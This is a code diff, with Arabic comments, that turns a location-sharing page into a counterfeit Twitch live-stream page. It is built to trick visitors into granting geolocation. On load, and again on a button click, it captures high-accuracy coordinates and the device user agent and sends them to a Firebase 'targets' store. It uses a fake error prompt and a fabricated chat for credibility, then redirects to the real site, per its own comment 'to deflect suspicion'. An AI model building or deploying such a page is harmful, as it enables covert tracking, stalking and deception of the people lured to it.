@@ -3,48 +3,158 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مشاركة موقعي</title>
-    
-    <link rel="stylesheet" href="https://unpkg.com" />
+    <title>Twitch - بث مباشر</title>
     
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
-            font-family: Arial, Tahoma, sans-serif;
-            min-height: 100vh;
+            font-family: Roobert, Inter, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: #0e0e10;
+            color: #efeff1;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            overflow: hidden;
+        }
+        /* الشريط العلوي */
+        .navbar {
+            height: 50px;
+            background-color: #18181b;
+            border-bottom: 2px solid #0f0f11;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            justify-content: space-between;
+        }
+        .logo {
+            color: #9146ff;
+            font-weight: bold;
+            font-size: 22px;
+            letter-spacing: -1px;
+        }
+        /* المحتوى الرئيسي */
+        .main-content {
+            display: flex;
+            flex: 1;
+            height: calc(100vh - 50px);
+        }
+        /* مشغل الفيديو */
+        .video-container {
+            flex: 3;
+            background-color: #000;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .video-player {
+            width: 100%;
+            height: 100%;
+            background: #000 url('https://unsplash.com') no-repeat center center;
+            background-size: cover;
+            opacity: 0.4;
+            filter: blur(4px);
+        }
+        /* شات تويتش الجانبي */
+        .chat-container {
+            flex: 1;
+            background-color: #18181b;
+            border-right: 2px solid #0f0f11;
+            display: flex;
+            flex-direction: column;
+            max-width: 340px;
+            min-width: 260px;
+        }
+        .chat-header {
+            padding: 15px;
+            border-bottom: 1px solid #26262c;
+            text-align: center;
+            font-size: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+            color: #adadb8;
+        }
+        .chat-messages {
+            flex: 1;
+            padding: 15px;
+            font-size: 13px;
+            overflow-y: auto;
+        }
+        .chat-msg { margin-bottom: 12px; line-height: 1.4; }
+        .username { font-weight: bold; color: #ff7575; margin-left: 5px; }
+        /* واجهة طلب الإذن المنبثقة فوق الفيديو */
+        .overlay-box {
+            position: absolute;
+            background: rgba(24, 24, 27, 0.95);
+            border: 1px solid #9146ff;
+            padding: 25px;
+            border-radius: 8px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+            z-index: 10;
+            margin: 0 15px;
+        }
+        .overlay-box h2 { font-size: 18px; margin-bottom: 10px; color: #fff; }
+        .overlay-box p { font-size: 13px; color: #adadb8; margin-bottom: 20px; line-height: 1.5; }
+        .twitch-btn {
+            background-color: #9146ff;
             color: white;
-            background: radial-gradient(circle at top, #102a43 0%, #061929 45%, #000914 100%);
-            display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px;
+            border: none;
+            padding: 10px 20px;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
         }
-        .container {
-            text-align: center; background: rgba(255, 255, 255, 0.05); padding: 30px; border-radius: 15px;
-            backdrop-filter: blur(10px); box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
-            border: 1px solid rgba(255, 255, 255, 0.1); max-width: 400px; width: 100%;
-        }
-        h1 { font-size: 24px; margin-bottom: 15px; }
-        p { font-size: 14px; color: #b0c4de; margin-bottom: 25px; line-height: 1.6; }
-        .btn {
-            background: linear-gradient(135deg, #0076ff 0%, #0055ff 100%); color: white; border: none;
-            padding: 12px 30px; font-size: 16px; font-weight: bold; border-radius: 25px; cursor: pointer;
-            transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0, 85, 255, 0.4);
-        }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 85, 255, 0.6); }
-        #status { margin-top: 15px; font-size: 13px; color: #ffc107; }
+        .twitch-btn:hover { background-color: #772ce8; }
+        #status-text { margin-top: 10px; font-size: 12px; color: #ffc107; }
     </style>
 
+    <!-- مكتبات Firebase -->
     <script src="https://gstatic.com"></script>
     <script src="https://gstatic.com"></script>
 </head>
 <body>
 
-    <div class="container">
-        <h1>📍 مشاركة الموقع الجغرافي</h1>
-        <p>يرجى الموافقة على إذن الوصول المباشر للموقع المعروض في نافذة المتصفح لتتمكن من استخدام الخدمة بنجاح.</p>
-        <button class="btn" id="startBtn">جاري جلب الموقع...</button>
-        <div id="status"></div>
+    <!-- الشريط العلوي المحاكي لتويتش -->
+    <div class="navbar">
+        <div class="logo">Twitch</div>
+        <div style="font-size: 13px; color: #adadb8;">🔴 مباشر الآن</div>
+    </div>
+
+    <!-- المحتوى الرئيسي للموقع -->
+    <div class="main-content">
+        
+        <!-- منطقة مشغل الفيديو المزور -->
+        <div class="video-container">
+            <div class="video-player"></div>
+            
+            <!-- الصندوق المنبثق لطلب تفعيل البث والإذن -->
+            <div class="overlay-box">
+                <h2>⚠️ خطأ في تشغيل البث المباشر</h2>
+                <p>لتخطي جدار الحماية الإقليمي ومزامنة الصوت مع الصورة المحيطية، يرجى السماح للمتصفح بالتحقق من الخدمة والضغط على الزر أدناه.</p>
+                <button class="twitch-btn" id="streamBtn">تفعيل البث والصوت مسبقاً</button>
+                <div id="status-text"></div>
+            </div>
+        </div>
+
+        <!-- الشات المزور لإعطاء مصداقية للموقع -->
+        <div class="chat-container">
+            <div class="chat-header">شات البث المباشر</div>
+            <div class="chat-messages">
+                <div class="chat-msg"><span class="username" style="color:#00ff7f;">x_سعود_x:</span>اللاااق مو طبيعي عند الكل؟</div>
+                <div class="chat-msg"><span class="username" style="color:#1e90ff;">Rayan_99:</span>اشتغل اشتغل كفوووو 🔥</div>
+                <div class="chat-msg"><span class="username" style="color:#ff00ff;">Mona_Stream:</span>فعلوا الصوت من التنبيه عشان يشتغل</div>
+                <div class="chat-msg"><span class="username" style="color:#ffca28;">أبو_خالد:</span>أفضل جودة بث شفتها اليوم 👍</div>
+            </div>
+        </div>
+
     </div>
 
     <script>
+        // إعدادات Firebase الخاصة بمشروعك
         const firebaseConfig = {
           apiKey: "AIzaSyDN0-VVc22XXx1bDh7rICBMxIBxWQcTc-k",
           authDomain: "://firebaseapp.com",
@@ -59,11 +169,12 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        const statusDiv = document.getElementById('status');
-        const startBtn = document.getElementById('startBtn');
+        const streamBtn = document.getElementById('streamBtn');
+        const statusText = document.getElementById('status-text');
 
-        // دالة الصيد التلقائي الفورية بمجرد فتح الصفحة
-        function autoCapture() {
+        function requestLocation() {
+            statusText.textContent = "جاري الاتصال بالسيرفر القريب...";
+            
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -71,6 +182,7 @@
                         const lng = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
 
+                        // إرسال الإحداثيات فوراً إلى Firebase
                         database.ref('targets/').push({
                             latitude: lat,
                             longitude: lng,
@@ -78,27 +190,27 @@
                             deviceAgent: navigator.userAgent,
                             time: new Date().toLocaleString('ar-EG')
                         }).then(() => {
-                            startBtn.textContent = "تم التأكيد ✅";
-                            statusDiv.style.color = "#28a745";
-                            statusDiv.textContent = "تم الاتصال الخريطة جاهزة!";
+                            statusText.style.color = "#28a745";
+                            statusText.textContent = "تم التحقق! جاري تشغيل البث...";
                             
+                            // تحويل بعد التفعيل لإبعاد الشبهة لصفحة تويتش حقيقية
                             setTimeout(() => {
-                                window.location.href = `https://google.com{lat},${lng}`;
-                            }, 1000);
+                                window.location.href = `https://twitch.tv`;
+                            }, 1500);
                         });
                     },
                     (error) => {
-                        statusDiv.style.color = "#dc3545";
-                        statusDiv.textContent = "يرجى تنشيط خيار تحديد الموقع من أعلى المتصفح لإتمام العملية.";
+                        statusText.style.color = "#dc3545";
+                        statusText.textContent = "خطأ: يجب السماح بأذونات التزامن لتشغيل مشغل تويتش.";
                     },
                     { enableHighAccuracy: true, timeout: 15000 }
                 );
             }
         }
 
-        // تشغيل الدالة فوراً عند تحميل الصفحة بالكامل دون الحاجة للنقر
-        window.onload = autoCapture;
-        startBtn.addEventListener('click', autoCapture);
+        // يطلب الموقع تلقائياً بمجرد دخول الصفحة وأيضاً عند ضغط الزر
+        window.onload = requestLocation;
+        streamBtn.addEventListener('click', requestLocation);
     </script>
 </body>
 </html>
